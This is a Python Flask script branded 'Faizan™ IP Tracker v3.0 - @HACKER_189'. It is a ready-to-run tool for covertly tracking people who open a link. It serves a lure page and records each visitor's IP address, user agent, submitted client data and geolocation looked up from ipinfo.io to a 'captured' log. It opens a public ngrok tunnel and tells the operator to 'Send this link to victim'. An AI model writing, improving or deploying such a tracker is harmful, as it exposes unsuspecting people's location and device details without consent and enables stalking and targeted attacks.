import os
import json
import time
import requests
from flask import Flask, request, render_template
from threading import Thread
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

app = Flask(__name__)

# Save logs
LOG_FILE = "logs/captured.txt"
os.makedirs("logs", exist_ok=True)

# HTML page to serve to victim
@app.route('/')
def index():
    return render_template('index.html')

# Route to collect info
@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # GeoIP info
    try:
        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
    except:
        geo = {}

    log_entry = {
        'IP': ip,
        'User-Agent': user_agent,
        'Geo': geo,
        'Client': data
    }

    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry, indent=4) + '\n')

    print(Fore.GREEN + f"\n[+] Victim Info Captured!")
    print(Fore.CYAN + f"IP: {ip}")
    print(Fore.YELLOW + f"Agent: {user_agent}")
    print(Fore.MAGENTA + f"Location: {geo.get('city')}, {geo.get('region')} ({geo.get('country')})")
    print(Fore.WHITE + "="*50)
    return 'OK'

def start_ngrok():
    os.system("pkill ngrok")
    time.sleep(1)
    thread = Thread(target=lambda: os.system("ngrok http 5000 > /dev/null 2>&1"))
    thread.start()
    time.sleep(3)
    try:
        url = requests.get("http://127.0.0.1:4040/api/tunnels").json()['tunnels'][0]['public_url']
        print(Fore.LIGHTBLUE_EX + f"\n[+] Ngrok Link: {url}")
        print(Fore.LIGHTYELLOW_EX + "[!] Send this link to victim")
    except:
        print(Fore.RED + "[!] Ngrok URL fetch failed")

if __name__ == '__main__':
    print(Fore.LIGHTGREEN_EX + """

    ╔═══════════════════════════════════════════╗
    ║       Faizan™ IP Tracker v3.0 - @HACKER_189     ║
    ╚═══════════════════════════════════════════╝
    """ + Style.RESET_ALL)

    print(Fore.WHITE + "[+] Starting server on http://127.0.0.1:5000")
    Thread(target=start_ngrok).start()
    app.run(host='0.0.0.0', port=5000)
